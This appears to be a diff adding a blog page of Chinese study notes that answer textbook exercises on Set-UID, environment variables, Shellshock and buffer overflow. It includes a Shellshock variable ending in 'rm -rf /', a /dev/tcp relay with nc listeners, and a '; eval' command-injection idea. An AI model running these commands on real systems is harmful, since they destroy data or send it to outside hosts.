@@ -1,0 +1,1333 @@
+<!--
+	作者：Sariay
+	时间：2018-08-26
+	描述：There may be a bug, but don't worry, Qiling(器灵) says that it can work normally! aha!
+-->
+<!DOCTYPE html>
+<html class="html-loading">
+		
+
+<head>
+	<meta charset="utf-8">
+  <meta http-equiv="X-UA-Compatible" content="IE=edge,chrome=1">
+	<meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1.0, user-scalable=no">
+  <title>
+    
+      《信息安全导论》配套练习与题解 | Archeri&#39;s Blog
+    
+  </title>
+  <meta name="author" content="Archeri Shade">
+  <meta name="keywords" content="" />
+  <meta name="description" content="" />
+	<!-- favicon -->
+  <link rel="shortcut icon" href="/img/favicon.ico">
+
+  <!-- css -->
+  
+<link rel="stylesheet" href="/css/Annie.css">
+
+  
+  <!-- jquery -->
+	
+<script src="/plugin/jquery/jquery.min.js"></script>
+
+
+<script>
+    const CONFIG_BGIMAGE = {
+      mode: 'random_you',
+      normalSrc: '/img/header-bg.jpg',
+      randomYouMax: 7,
+      randomYouSrc: '/img/Random-img/',
+	  randomOtherSrc: 'https://api.berryapi.net/?service=App.Bing.Images&day=-0',
+	  preloaderEnable: true
+    }
+	
+    const CONFIG_LEACLOUD_COUNT = {
+      enable: false,
+	  appId: 'AU8...',
+	  appKey: '4cU...',
+	  serverURLs: 'http' || ' '
+    }
+  </script>
+<meta name="generator" content="Hexo 7.3.0"></head>
+	<body>
+		<!-- Preloader -->
+
+	<div id="preloader">
+		<div class="pre-container">
+			
+				<div class="spinner">
+					<div class="double-bounce1"></div>
+					<div class="double-bounce2"></div>
+				</div>
+						
+		</div>
+	</div>
+
+
+<!-- header -->
+<header class="fixbackground bg-pan-br">
+	<div class="mask">
+		<!-- motto -->
+		<div class="h-body">	
+			
+				<div class="motto text-shadow-pop-left">
+					<p class="content" id="motto-content">获取中...</p>
+					<p>-<p>
+					<p class="author" id="motto-author">Just a minute...</p>
+				</div>
+			
+		</div>
+		
+		<!-- others: such as time... -->			
+		<div class="h-footer">
+			<a href="javascript:;" id="read-more" class="scroll-down">
+				<span class="icon-anchor1 animation-scroll-down"></span>
+			</a>
+		</div>
+	</div>
+</header>
+
+<div id="navigation-hide">
+	<!-- Progress bar -->
+	<div id="progress-bar"></div>
+
+	<!-- Progress percent -->
+	<div id="progress-percentage"><span>0.0%</span></div>
+
+	<div class="toc-switch"><span class="switch-button">目录</span></div>
+
+	<!-- Page title -->
+	<p>
+		
+			「《信息安全导论》配套练习与题解」
+		
+	</p>
+
+	
+	
+
+	<!-- Nav trigger for navigation-H-->
+	<a class="nav-trigger"><span></span></a>
+</div>
+
+<!-- Navigation in div(id="navigation-H") -->
+<nav class="nav-container" id="cd-nav">
+	<div class="nav-header">
+		<span class="logo"> 
+			<img src="/img/logo.png">
+		</span>
+		<a href="javascript:;" class="nav-close"></a>
+	</div>
+	
+	<div class="nav-body">
+		<ul id="global-nav">
+	
+		<li class="menu-home">
+			<a href="/" class="menu-item-home" target="_blank">主页</a>
+		</li>
+		
+	
+		<li class="menu-archive">
+			<a href="/archives" class="menu-item-archive" target="_blank">归档</a>
+		</li>
+		
+	
+		<li class="menu-categories">
+			<a href="/categories" class="menu-item-categories" target="_blank">分类</a>
+		</li>
+		
+	
+		<li class="menu-tags">
+			<a href="/tags" class="menu-item-tags" target="_blank">标签</a>
+		</li>
+		
+	
+		<li class="menu-about">
+			<a href="/about" class="menu-item-about" target="_blank">关于</a>
+		</li>
+		
+	
+		<li class="menu-gallery">
+			<a href="/gallery" class="menu-item-gallery" target="_blank">相册</a>
+		</li>
+		
+	
+
+	
+		<li class="menu-search">
+			<a href="javascript:;" class="popup-trigger">搜索</a>
+		</li>
+	
+</ul>
+	</div>
+	
+	<div class="nav-footer">
+		<ul id="global-social">
+	
+		<li>
+			<a href="https://github.com/ArcheriShade" target="_blank">
+				<span class="icon-github"></span>
+			</a>
+		</li>
+			
+</ul>
+
+	</div>
+</nav>
+			
+		<!--main-->
+		<main>
+			<!--
+	时间：2018-11-17
+	描述：
+		插件名称：katelog.min.js
+		插件作者：KELEN
+		插件来源: https://github.com/KELEN/katelog
+-->
+
+	
+		<div class="layout-toc">
+			<div id="layout-toc">
+				<div class="k-catelog-list" id="catelog-list" data-title="文章目录"></div>
+			</div>
+		</div>
+
+		
+<script src="/plugin/toc/katelog.min.js"></script>
+
+
+		
+	 
+
+<div class="layout-post">
+	<div id="layout-post">
+		<div class="article-title">
+			
+	<a href="/2023/02/28/%E3%80%8A%E4%BF%A1%E6%81%AF%E5%AE%89%E5%85%A8%E5%AF%BC%E8%AE%BA%E3%80%8B%E9%85%8D%E5%A5%97%E7%BB%83%E4%B9%A0%E4%B8%8E%E9%A2%98%E8%A7%A3/" itemprop="url">
+		《信息安全导论》配套练习与题解
+	</a>
+
+		</div>
+
+		<div class="article-meta">
+			<span>
+				<i class="icon-calendar1"></i>
+				
+				
+
+
+
+
+	更新于
+
+	<a href="/2023/02/28/%E3%80%8A%E4%BF%A1%E6%81%AF%E5%AE%89%E5%85%A8%E5%AF%BC%E8%AE%BA%E3%80%8B%E9%85%8D%E5%A5%97%E7%BB%83%E4%B9%A0%E4%B8%8E%E9%A2%98%E8%A7%A3/" itemprop="url">
+		<time datetime="2023-02-28T11:12:31.000Z" itemprop="dateUpdated">
+	  		2023-02-28
+	  </time>
+	</a> 
+
+
+
+			</span>
+			<span>
+				
+	<i class="icon-price-tags"></i>
+	
+		<a href="/tags/SEED/" class=" ">
+			SEED
+		</a>
+	
+		<a href="/tags/%E4%BF%A1%E6%81%AF%E5%AE%89%E5%85%A8%E5%AF%BC%E8%AE%BA/" class=" ">
+			信息安全导论
+		</a>
+	
+		<a href="/tags/%E8%BD%AF%E4%BB%B6%E5%AE%89%E5%85%A8/" class=" ">
+			软件安全
+		</a>
+	
+		<a href="/tags/Web%E5%AE%89%E5%85%A8/" class=" ">
+			Web安全
+		</a>
+	
+		<a href="/tags/%E7%BD%91%E7%BB%9C%E5%AE%89%E5%85%A8/" class=" ">
+			网络安全
+		</a>
+	
+		<a href="/tags/SEEDbooks/" class=" ">
+			SEEDbooks
+		</a>
+	
+		
+			</span>
+			
+			
+
+
+
+		</div>
+
+		<div class="article-content" id="article-content">
+			<p>&#x3D;&#x3D;目前只有前两大章的内容，最后一章网络安全还没看&#x3D;&#x3D;</p>
+<h1 id="01-Set-UID-ex"><a href="#01-Set-UID-ex" class="headerlink" title="01_Set-UID_ex"></a>01_Set-UID_ex</h1><p><img src="/2023/02/28/%E3%80%8A%E4%BF%A1%E6%81%AF%E5%AE%89%E5%85%A8%E5%AF%BC%E8%AE%BA%E3%80%8B%E9%85%8D%E5%A5%97%E7%BB%83%E4%B9%A0%E4%B8%8E%E9%A2%98%E8%A7%A3/image-20221128144115338.png" alt="image-20221128144115338"></p>
+<p>不可以，因为Bob own的Set-UID程序，运行时的有效uid是Bob</p>
+<p><img src="/2023/02/28/%E3%80%8A%E4%BF%A1%E6%81%AF%E5%AE%89%E5%85%A8%E5%AF%BC%E8%AE%BA%E3%80%8B%E9%85%8D%E5%A5%97%E7%BB%83%E4%B9%A0%E4%B8%8E%E9%A2%98%E8%A7%A3/image-20221128144558153.png" alt="image-20221128144558153"></p>
+<p>不行，还是因为有效uid为1000，不是2000</p>
+<p><img src="/2023/02/28/%E3%80%8A%E4%BF%A1%E6%81%AF%E5%AE%89%E5%85%A8%E5%AF%BC%E8%AE%BA%E3%80%8B%E9%85%8D%E5%A5%97%E7%BB%83%E4%B9%A0%E4%B8%8E%E9%A2%98%E8%A7%A3/image-20221128144814499.png" alt="image-20221128144814499"></p>
+<p>内部定义好的行为、受限的用户行为</p>
+<p><img src="/2023/02/28/%E3%80%8A%E4%BF%A1%E6%81%AF%E5%AE%89%E5%85%A8%E5%AF%BC%E8%AE%BA%E3%80%8B%E9%85%8D%E5%A5%97%E7%BB%83%E4%B9%A0%E4%B8%8E%E9%A2%98%E8%A7%A3/image-20221128145247593.png" alt="image-20221128145247593"></p>
+<p>不能，因为设置<code>chown</code>会清空Set-UID比特位<br>（单纯地复制也会清空Set-UID比特位）<br>（程序的拥有者才可以自主决定是否使用Set-UID位）</p>
+<p><img src="/2023/02/28/%E3%80%8A%E4%BF%A1%E6%81%AF%E5%AE%89%E5%85%A8%E5%AF%BC%E8%AE%BA%E3%80%8B%E9%85%8D%E5%A5%97%E7%BB%83%E4%B9%A0%E4%B8%8E%E9%A2%98%E8%A7%A3/image-20221128145731182.png" alt="image-20221128145731182"></p>
+<p>同上题，新的拥有者必须再次自主决定是否设置Set-UID比特位</p>
+<p><img src="/2023/02/28/%E3%80%8A%E4%BF%A1%E6%81%AF%E5%AE%89%E5%85%A8%E5%AF%BC%E8%AE%BA%E3%80%8B%E9%85%8D%E5%A5%97%E7%BB%83%E4%B9%A0%E4%B8%8E%E9%A2%98%E8%A7%A3/image-20221128150117471.png" alt="image-20221128150117471"></p>
+<p>只有root或以root权限运行地debuger才能调试一个Set-UID程序</p>
+<p><img src="/2023/02/28/%E3%80%8A%E4%BF%A1%E6%81%AF%E5%AE%89%E5%85%A8%E5%AF%BC%E8%AE%BA%E3%80%8B%E9%85%8D%E5%A5%97%E7%BB%83%E4%B9%A0%E4%B8%8E%E9%A2%98%E8%A7%A3/image-20221128150753047.png" alt="image-20221128150753047"></p>
+<p><code>system()</code>：传入的参数是调给一个shell，<code>/bin/sh -c &#123;input&#125;</code>执行的，可以注入恶意代码，没有做到输入数据与代码分隔</p>
+<p><code>execve()</code>：直接调用的是系统调用，没有打开shell，传入的参数严格做到了数据与代码的隔离（只当成字符串处理）</p>
+<p><img src="/2023/02/28/%E3%80%8A%E4%BF%A1%E6%81%AF%E5%AE%89%E5%85%A8%E5%AF%BC%E8%AE%BA%E3%80%8B%E9%85%8D%E5%A5%97%E7%BB%83%E4%B9%A0%E4%B8%8E%E9%A2%98%E8%A7%A3/image-20221128151151968.png" alt="image-20221128151151968"></p>
+<p><del>可以</del></p>
+<p>不可以</p>
+<p><img src="/2023/02/28/%E3%80%8A%E4%BF%A1%E6%81%AF%E5%AE%89%E5%85%A8%E5%AF%BC%E8%AE%BA%E3%80%8B%E9%85%8D%E5%A5%97%E7%BB%83%E4%B9%A0%E4%B8%8E%E9%A2%98%E8%A7%A3/image-20221128151846767.png" alt="image-20221128151846767"></p>
+<p>因为prog程序与其后面输入的文件无关</p>
+<p>普通用户无法访问&#x2F;etc&#x2F;shadow，因此无法使用Set-UID程序重定向输入设备</p>
+<p><img src="/2023/02/28/%E3%80%8A%E4%BF%A1%E6%81%AF%E5%AE%89%E5%85%A8%E5%AF%BC%E8%AE%BA%E3%80%8B%E9%85%8D%E5%A5%97%E7%BB%83%E4%B9%A0%E4%B8%8E%E9%A2%98%E8%A7%A3/image-20221128151952988.png" alt="image-20221128151952988"></p>
+<p>没有危险。虽然parent Set-UID进程以root权限运行，但父Set-UID进程的父用户ID为bob，Bob最初是从shell或类似程序执行父Set UID程序的。因此，父Set-UID程序的标准输入、输出和错误设备是从shell继承的，然后子进程再次继承。由于子进程和父进程具有相同的特权，因此不存在功能泄漏。</p>
+<p><img src="/2023/02/28/%E3%80%8A%E4%BF%A1%E6%81%AF%E5%AE%89%E5%85%A8%E5%AF%BC%E8%AE%BA%E3%80%8B%E9%85%8D%E5%A5%97%E7%BB%83%E4%B9%A0%E4%B8%8E%E9%A2%98%E8%A7%A3/image-20221128153126190.png" alt="image-20221128153126190"></p>
+<p><code>man more</code></p>
+<p>有一个参数<code>v</code></p>
+<blockquote>
+<p>Start up an editor at current line. The editor is taken from the environment variable VISUAL if defined, or EDITOR if VISUAL is not defined, or defaults to vi(1) if neither VISUAL nor EDITOR is defined.</p>
+</blockquote>
+<p>貌似是，<code>more</code>的交互式指令是基于<code>vi</code>的，因此可以使用<code>!command</code>或者<code>:!command</code>在一个subshell中执行指令</p>
+<p>也就是说可以通过这个Set-UID的<code>mymore</code>执行额外行为</p>
+<p><img src="/2023/02/28/%E3%80%8A%E4%BF%A1%E6%81%AF%E5%AE%89%E5%85%A8%E5%AF%BC%E8%AE%BA%E3%80%8B%E9%85%8D%E5%A5%97%E7%BB%83%E4%B9%A0%E4%B8%8E%E9%A2%98%E8%A7%A3/image-20221128163006365.png" alt="image-20221128163006365"></p>
+<p>？创建一个包含所有id小于1000的用户的新组？</p>
+<p><img src="/2023/02/28/%E3%80%8A%E4%BF%A1%E6%81%AF%E5%AE%89%E5%85%A8%E5%AF%BC%E8%AE%BA%E3%80%8B%E9%85%8D%E5%A5%97%E7%BB%83%E4%B9%A0%E4%B8%8E%E9%A2%98%E8%A7%A3/image-20221128163153845.png" alt="image-20221128163153845"></p>
+<p>(1) 命令注入啊，把某个下载的url后面改成类似“; eval attack”这样？</p>
+<p>(2) 改用<code>execve</code>，不用<code>system</code></p>
+<h1 id="02-EnvironmentVariable-ex"><a href="#02-EnvironmentVariable-ex" class="headerlink" title="02_EnvironmentVariable_ex"></a>02_EnvironmentVariable_ex</h1><p><img src="/2023/02/28/%E3%80%8A%E4%BF%A1%E6%81%AF%E5%AE%89%E5%85%A8%E5%AF%BC%E8%AE%BA%E3%80%8B%E9%85%8D%E5%A5%97%E7%BB%83%E4%B9%A0%E4%B8%8E%E9%A2%98%E8%A7%A3/image-20221212212139792.png" alt="image-20221212212139792"></p>
+<blockquote>
+<p>shell程序开始执行时，为进程中的每个环境变量创建一个名称和值都相同的shell变量，可以通过这些shell变量获取环境变量的值<br>shell变量和环境变量是相互独立的，改变其中一个不会影响到另一个</p>
+</blockquote>
+<p><img src="/2023/02/28/%E3%80%8A%E4%BF%A1%E6%81%AF%E5%AE%89%E5%85%A8%E5%AF%BC%E8%AE%BA%E3%80%8B%E9%85%8D%E5%A5%97%E7%BB%83%E4%B9%A0%E4%B8%8E%E9%A2%98%E8%A7%A3/image-20221212215031373.png" alt="image-20221212215031373"></p>
+<p>no，但是export出来的shell变量会被传递到子进程</p>
+<p>因此使用<code>env | grep foo</code>会打印出来这个变量<br>但是用<code>strings /proc/$$/environ | grep foo</code>不会，说明没改变当前的环境变量</p>
+<p><img src="/2023/02/28/%E3%80%8A%E4%BF%A1%E6%81%AF%E5%AE%89%E5%85%A8%E5%AF%BC%E8%AE%BA%E3%80%8B%E9%85%8D%E5%A5%97%E7%BB%83%E4%B9%A0%E4%B8%8E%E9%A2%98%E8%A7%A3/image-20221213135135484.png" alt="image-20221213135135484"></p>
+<p><code>env</code>是运行一个新的程序，打印的是子进程的环境变量<br>而<code>strings /proc/$$/environ</code>打印的是当前进程的环境变量</p>
+<p><img src="/2023/02/28/%E3%80%8A%E4%BF%A1%E6%81%AF%E5%AE%89%E5%85%A8%E5%AF%BC%E8%AE%BA%E3%80%8B%E9%85%8D%E5%A5%97%E7%BB%83%E4%B9%A0%E4%B8%8E%E9%A2%98%E8%A7%A3/image-20221213140641944.png" alt="image-20221213140641944"></p>
+<p>0，显式地传入了<code>NULL</code></p>
+<p><img src="/2023/02/28/%E3%80%8A%E4%BF%A1%E6%81%AF%E5%AE%89%E5%85%A8%E5%AF%BC%E8%AE%BA%E3%80%8B%E9%85%8D%E5%A5%97%E7%BB%83%E4%B9%A0%E4%B8%8E%E9%A2%98%E8%A7%A3/image-20221213140729269.png" alt="image-20221213140729269"></p>
+<p>no</p>
+<p>自己写代码不用，不代表用的第三方函数、库或程序啥的不用环境变量<br>（链接器、程序库、外部程序）</p>
+<p><img src="/2023/02/28/%E3%80%8A%E4%BF%A1%E6%81%AF%E5%AE%89%E5%85%A8%E5%AF%BC%E8%AE%BA%E3%80%8B%E9%85%8D%E5%A5%97%E7%BB%83%E4%B9%A0%E4%B8%8E%E9%A2%98%E8%A7%A3/image-20221213141719089.png" alt="image-20221213141719089"></p>
+<p>传输路径：shell -&gt; abc -&gt; xyz -&gt; shell？</p>
+<p>P36，总之就是可以通过修改<code>PATH</code>环境变量，执行攻击者的xyz程序</p>
+<p><img src="/2023/02/28/%E3%80%8A%E4%BF%A1%E6%81%AF%E5%AE%89%E5%85%A8%E5%AF%BC%E8%AE%BA%E3%80%8B%E9%85%8D%E5%A5%97%E7%BB%83%E4%B9%A0%E4%B8%8E%E9%A2%98%E8%A7%A3/image-20221213151744458.png" alt="image-20221213151744458"></p>
+<p>P40，<code>secure_getenv()</code>会在需要“安全执行”的形况下返回<code>NULL</code>（比如有效ID与真实ID不一致时）</p>
+<p><img src="/2023/02/28/%E3%80%8A%E4%BF%A1%E6%81%AF%E5%AE%89%E5%85%A8%E5%AF%BC%E8%AE%BA%E3%80%8B%E9%85%8D%E5%A5%97%E7%BB%83%E4%B9%A0%E4%B8%8E%E9%A2%98%E8%A7%A3/image-20221213151930137.png" alt="image-20221213151930137"></p>
+<p>P40，<code>PWD</code>环境变量容易被用户操作，所以<code>getcwd()</code>better？（似乎有长度获取限制）</p>
+<p><img src="/2023/02/28/%E3%80%8A%E4%BF%A1%E6%81%AF%E5%AE%89%E5%85%A8%E5%AF%BC%E8%AE%BA%E3%80%8B%E9%85%8D%E5%A5%97%E7%BB%83%E4%B9%A0%E4%B8%8E%E9%A2%98%E8%A7%A3/image-20221213160930163.png" alt="image-20221213160930163"></p>
+<p>P33，真实ID与有效ID不一致时，动态链接器有一些防御机制，将会忽略一些可能会对链接行为有影响的环境变量</p>
+<p><code>LD_AUDIT</code>：</p>
+<blockquote>
+<p>以冒号分隔的用户指定的ELF共享对象列表，将在单独的链接器命名空间（即，不会干扰进程中发生的正常符号绑定的命名空间）中先于所有其他对象加载。这些库可用于审核动态链接器的操作。</p>
+</blockquote>
+<p><code>LD_DEBUG_OUTPUT</code>：</p>
+<blockquote>
+<p>LD_DEBUG（输出有关动态链接器的详细调试信息）输出对应输入的文件，默认为标准输出。</p>
+</blockquote>
+<p><img src="/2023/02/28/%E3%80%8A%E4%BF%A1%E6%81%AF%E5%AE%89%E5%85%A8%E5%AF%BC%E8%AE%BA%E3%80%8B%E9%85%8D%E5%A5%97%E7%BB%83%E4%B9%A0%E4%B8%8E%E9%A2%98%E8%A7%A3/image-20221213161540527.png" alt="image-20221213161540527"></p>
+<p>P41（deamon，守护进程）</p>
+<h1 id="03-Shellshock-ex"><a href="#03-Shellshock-ex" class="headerlink" title="03_Shellshock_ex"></a>03_Shellshock_ex</h1><p><img src="/2023/02/28/%E3%80%8A%E4%BF%A1%E6%81%AF%E5%AE%89%E5%85%A8%E5%AF%BC%E8%AE%BA%E3%80%8B%E9%85%8D%E5%A5%97%E7%BB%83%E4%B9%A0%E4%B8%8E%E9%A2%98%E8%A7%A3/image-20230106155903609.png" alt="image-20230106155903609"></p>
+<p>在修复漏洞之前，子进程中将不存在该变量，但会有一个变量名为的函数，函数体将是该变量的值。<br>修复漏洞后，子shell将具有与父shell相同的变量。</p>
+<p><img src="/2023/02/28/%E3%80%8A%E4%BF%A1%E6%81%AF%E5%AE%89%E5%85%A8%E5%AF%BC%E8%AE%BA%E3%80%8B%E9%85%8D%E5%A5%97%E7%BB%83%E4%B9%A0%E4%B8%8E%E9%A2%98%E8%A7%A3/image-20230106160049848.png" alt="image-20230106160049848"></p>
+<p>父shell创建进程时，会将每个导出的函数作为环境变量传递。当子进程运行bash（或者子进程本身是bash）时，它将解析环境变量并将其转换回函数。这是因为子进程获取父环境变量的副本。</p>
+<p><img src="/2023/02/28/%E3%80%8A%E4%BF%A1%E6%81%AF%E5%AE%89%E5%85%A8%E5%AF%BC%E8%AE%BA%E3%80%8B%E9%85%8D%E5%A5%97%E7%BB%83%E4%B9%A0%E4%B8%8E%E9%A2%98%E8%A7%A3/image-20230106160255145.png" alt="image-20230106160255145"></p>
+<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">seed@ubuntu:~$ export foo=&#x27;() &#123; echo Hello World; &#125;; rm -rf /&#x27;</span><br><span class="line">seed@ubuntu:~$ bash</span><br></pre></td></tr></table></figure>
+
+<p><img src="/2023/02/28/%E3%80%8A%E4%BF%A1%E6%81%AF%E5%AE%89%E5%85%A8%E5%AF%BC%E8%AE%BA%E3%80%8B%E9%85%8D%E5%A5%97%E7%BB%83%E4%B9%A0%E4%B8%8E%E9%A2%98%E8%A7%A3/image-20230106161440469.png" alt="image-20230106161440469"></p>
+<p>不。该漏洞仅在变量值以“（）{”开头时存在。如果不是，则将其视为常规字符串，foo将作为子进程中的变量提供。</p>
+<p><img src="/2023/02/28/%E3%80%8A%E4%BF%A1%E6%81%AF%E5%AE%89%E5%85%A8%E5%AF%BC%E8%AE%BA%E3%80%8B%E9%85%8D%E5%A5%97%E7%BB%83%E4%B9%A0%E4%B8%8E%E9%A2%98%E8%A7%A3/image-20230106161605897.png" alt="image-20230106161605897"></p>
+<p>1.目标进程应该运行bash。<br>2.进程必须从外部获取一些<strong>环境变量</strong>，例如不受信任的用户。</p>
+<p><img src="/2023/02/28/%E3%80%8A%E4%BF%A1%E6%81%AF%E5%AE%89%E5%85%A8%E5%AF%BC%E8%AE%BA%E3%80%8B%E9%85%8D%E5%A5%97%E7%BB%83%E4%B9%A0%E4%B8%8E%E9%A2%98%E8%A7%A3/image-20230106161637143.png" alt="image-20230106161637143"></p>
+<p>像Apache这样的web服务器将客户端头信息（如用户代理）作为环境变量传递给它们调用的CGI程序。例如，通过手动设置User-Agent字段，我们可以确保在远程计算机上有一个环境变量，该变量的值由我们选择。</p>
+<p><img src="/2023/02/28/%E3%80%8A%E4%BF%A1%E6%81%AF%E5%AE%89%E5%85%A8%E5%AF%BC%E8%AE%BA%E3%80%8B%E9%85%8D%E5%A5%97%E7%BB%83%E4%B9%A0%E4%B8%8E%E9%A2%98%E8%A7%A3/image-20230106162219034.png" alt="image-20230106162219034"></p>
+<p>不存在。bash漏洞的存在是因为它在环境变量的值的开头查找字符串“（）{”，如果匹配，它会将其视为函数并继续对其进行解析。bash看起来不像函数定义，它将把它当作一个简单的字符串，而不运行命令。</p>
+<p><img src="/2023/02/28/%E3%80%8A%E4%BF%A1%E6%81%AF%E5%AE%89%E5%85%A8%E5%AF%BC%E8%AE%BA%E3%80%8B%E9%85%8D%E5%A5%97%E7%BB%83%E4%B9%A0%E4%B8%8E%E9%A2%98%E8%A7%A3/image-20230106162551378.png" alt="image-20230106162551378"></p>
+<p>p47 错误的解析代码parse_and_execute() 造成了安全漏洞</p>
+<p><img src="/2023/02/28/%E3%80%8A%E4%BF%A1%E6%81%AF%E5%AE%89%E5%85%A8%E5%AF%BC%E8%AE%BA%E3%80%8B%E9%85%8D%E5%A5%97%E7%BB%83%E4%B9%A0%E4%B8%8E%E9%A2%98%E8%A7%A3/image-20230106162814682.png" alt="image-20230106162814682"></p>
+<p>P57？</p>
+<p><img src="/2023/02/28/%E3%80%8A%E4%BF%A1%E6%81%AF%E5%AE%89%E5%85%A8%E5%AF%BC%E8%AE%BA%E3%80%8B%E9%85%8D%E5%A5%97%E7%BB%83%E4%B9%A0%E4%B8%8E%E9%A2%98%E8%A7%A3/image-20230106163302732.png" alt="image-20230106163302732"></p>
+<p>将10.0.2.6:7070的端口作为重定向后的输入，cat出来</p>
+<p>nc-L7070将监听端口7070上的传入连接 所以机器1 会 在屏幕上显示机器2输入的任何内容</p>
+<p><img src="/2023/02/28/%E3%80%8A%E4%BF%A1%E6%81%AF%E5%AE%89%E5%85%A8%E5%AF%BC%E8%AE%BA%E3%80%8B%E9%85%8D%E5%A5%97%E7%BB%83%E4%B9%A0%E4%B8%8E%E9%A2%98%E8%A7%A3/image-20230106164030627.png" alt="image-20230106164030627"></p>
+<p>Machine2:<br>$ nc -l 7070</p>
+<p>Machine3:<br>$ nc -l 7070</p>
+<p>Machine 1:<br>$ &#x2F;bin&#x2F;cat &lt; &#x2F;dev&#x2F;tcp&#x2F;Machine2&#x2F;7070 &gt; &#x2F;dev&#x2F;tcp&#x2F;Machine3&#x2F;7070</p>
+<p><img src="/2023/02/28/%E3%80%8A%E4%BF%A1%E6%81%AF%E5%AE%89%E5%85%A8%E5%AF%BC%E8%AE%BA%E3%80%8B%E9%85%8D%E5%A5%97%E7%BB%83%E4%B9%A0%E4%B8%8E%E9%A2%98%E8%A7%A3/image-20230106164218211.png" alt="image-20230106164218211"></p>
+<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdlib.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;unistd.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="keyword">extern</span> <span class="type">char</span> **environ;</span><br><span class="line"></span><br><span class="line"><span class="type">int</span> <span class="title function_">main</span><span class="params">()</span> &#123;</span><br><span class="line">    <span class="type">char</span> *args[] =</span><br><span class="line">    &#123;</span><br><span class="line">        <span class="string">&quot;/bin/sh&quot;</span>, <span class="string">&quot;-c&quot;</span>,</span><br><span class="line">        <span class="string">&quot;/bin/ls&quot;</span>, <span class="literal">NULL</span></span><br><span class="line">    &#125;;</span><br><span class="line">    <span class="type">pid_t</span> pid = fork();</span><br><span class="line">    </span><br><span class="line">    <span class="keyword">if</span>(pid == <span class="number">0</span>) &#123;</span><br><span class="line">        <span class="comment">/* child */</span></span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">&quot;child\n&quot;</span>);</span><br><span class="line">        execve(args[<span class="number">0</span>], &amp;args[<span class="number">0</span>], <span class="literal">NULL</span>);	<span class="comment">//1</span></span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">else</span> <span class="keyword">if</span>(pid &gt; <span class="number">0</span>) &#123;</span><br><span class="line">        <span class="comment">/* parent */</span></span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">&quot;parent\n&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+<p><img src="/2023/02/28/%E3%80%8A%E4%BF%A1%E6%81%AF%E5%AE%89%E5%85%A8%E5%AF%BC%E8%AE%BA%E3%80%8B%E9%85%8D%E5%A5%97%E7%BB%83%E4%B9%A0%E4%B8%8E%E9%A2%98%E8%A7%A3/image-20230106164500635.png" alt="image-20230106164500635"></p>
+<p><code>execve</code>函数的第三个参数是<code>NULL</code>，没有指定传入父进程的环境变量，所以不会打印“world”</p>
+<p><img src="/2023/02/28/%E3%80%8A%E4%BF%A1%E6%81%AF%E5%AE%89%E5%85%A8%E5%AF%BC%E8%AE%BA%E3%80%8B%E9%85%8D%E5%A5%97%E7%BB%83%E4%B9%A0%E4%B8%8E%E9%A2%98%E8%A7%A3/image-20230106164641934.png" alt="image-20230106164641934"></p>
+<p>这个时候的<code>foo</code>变量会被传入，所以会触发没有修复漏洞的bash漏洞</p>
+<p><img src="/2023/02/28/%E3%80%8A%E4%BF%A1%E6%81%AF%E5%AE%89%E5%85%A8%E5%AF%BC%E8%AE%BA%E3%80%8B%E9%85%8D%E5%A5%97%E7%BB%83%E4%B9%A0%E4%B8%8E%E9%A2%98%E8%A7%A3/image-20230106164740155.png" alt="image-20230106164740155"></p>
+<p>p57 shell shock漏洞要求满足两个条件</p>
+<p>bash调用<br>传入用户数据作为环境变量</p>
+<p>但再php脚本中并不总是能被满足 如果不用cgi 则apache无法通过环境变量传给php程序</p>
+<h1 id="04-Buffer-Overflow-ex"><a href="#04-Buffer-Overflow-ex" class="headerlink" title="04_Buffer_Overflow_ex"></a>04_Buffer_Overflow_ex</h1><p><img src="/2023/02/28/%E3%80%8A%E4%BF%A1%E6%81%AF%E5%AE%89%E5%85%A8%E5%AF%BC%E8%AE%BA%E3%80%8B%E9%85%8D%E5%A5%97%E7%BB%83%E4%B9%A0%E4%B8%8E%E9%A2%98%E8%A7%A3/image-20230111182957531.png" alt="image-20230111182957531"></p>
+<p>in the stack</p>
+<p>因为a是函数的参数，x是函数内部参数，都会放到函数的栈中</p>
+<p>通过函数栈帧的EBP+偏移确定位置</p>
+<p><img src="/2023/02/28/%E3%80%8A%E4%BF%A1%E6%81%AF%E5%AE%89%E5%85%A8%E5%AF%BC%E8%AE%BA%E3%80%8B%E9%85%8D%E5%A5%97%E7%BB%83%E4%B9%A0%E4%B8%8E%E9%A2%98%E8%A7%A3/image-20230111183132492.png" alt="image-20230111183132492"></p>
+<p><code>i</code>：data</p>
+<p><code>str</code>：stack</p>
+<p><code>ptr</code>：heap</p>
+<p><code>buf</code>：stack</p>
+<p><code>j</code>：stack</p>
+<p><code>y</code>：BBS</p>
+<p><img src="/2023/02/28/%E3%80%8A%E4%BF%A1%E6%81%AF%E5%AE%89%E5%85%A8%E5%AF%BC%E8%AE%BA%E3%80%8B%E9%85%8D%E5%A5%97%E7%BB%83%E4%B9%A0%E4%B8%8E%E9%A2%98%E8%A7%A3/image-20230111183827390.png" alt="image-20230111183827390"></p>
+<p>str<br>返回地址<br>上一个栈帧的指针<br>buffer[23]<br>.<br>.<br>.<br>buffer[0]</p>
